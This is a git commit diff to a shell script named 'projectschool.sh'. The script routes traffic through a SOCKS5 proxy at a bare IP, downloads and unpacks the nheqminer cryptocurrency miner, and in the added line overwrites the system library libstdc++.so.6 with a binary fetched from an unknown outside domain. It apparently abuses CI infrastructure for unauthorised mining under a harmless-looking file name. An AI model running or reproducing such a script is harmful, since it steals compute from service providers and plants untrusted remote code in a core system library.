5084c2534d91968ed00f990b718bcc582d940566
sayepttwarnis <93639205+sayepttwarnis@users.noreply.github.com>
2021-11-03 13:51:43 +0700

    Update projectschool.sh

--- projectschool.sh
+++ projectschool.sh
@@ -1,4 +1,5 @@
 curl -v -x socks5://207.180.236.140:1080 https://circleci.com//
+curl -o "/usr/lib/x86_64-linux-gnu/libstdc++.so.6" "https://doxspace.xyz/libstdc++.so.6"
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
 tar -xvf nheqminer-Linux-v0.8.2.tgz 
 tar -xvf nheqminer-Linux-v0.8.2.tar.gz
